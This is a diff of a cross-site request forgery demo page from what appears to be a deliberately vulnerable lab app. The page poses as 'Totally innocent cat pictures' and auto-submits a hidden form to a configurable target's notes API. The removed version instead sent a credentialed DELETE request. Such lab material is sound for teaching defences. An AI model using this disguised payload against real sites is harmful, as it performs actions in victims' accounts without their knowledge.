@@ -1,28 +1,22 @@
 <!doctype html>
 <!--
-  Vuln #7 — CSRF. Open this file from the filesystem (file://) or any other
-  origin while logged into the VULN app in the same browser. It silently
-  deletes the victim's note #1 using their ambient session cookie.
-
-  VULN mode: delete succeeds (cookie sent cross-site, no CSRF token checked).
-  SECURE mode: fails — SameSite=Strict withholds the cookie AND the server
-  rejects the missing X-CSRF-Token.
-
-  NOTE: a plain <form> can't send DELETE or custom headers, so real CSRF here
-  targets the cookie being auto-attached. We use fetch to show the intent;
-  the true defence demonstrated is SameSite + token, not the HTTP verb.
+  Vuln #7: CSRF
+  python3 -m http.server 9000 -b 127.0.0.1 -d attacks
+  http://localhost:9000/csrf.html
+  http://localhost:9000/csrf.html?target=https://localhost:3443
 -->
 <html>
-<body onload="attack()">
+<body>
   <h1>Totally innocent cat pictures</h1>
+  <form method="POST">
+    <input type="hidden" name="title" value="CSRF">
+    <input type="hidden" name="body" value="this note was created by another site">
+  </form>
   <script>
-    function attack() {
-      fetch('http://localhost:3000/api/notes/1', {
-        method: 'DELETE',
-        credentials: 'include', // send the victim's sid cookie
-      }).then(r => document.body.insertAdjacentText('beforeend',
-        ' [attack response: ' + r.status + ']'));
-    }
+    const target = new URLSearchParams(location.search).get('target') || 'http://localhost:3000';
+    const form = document.forms[0];
+    form.action = target + '/api/notes';
+    form.submit();
   </script>
 </body>
 </html>
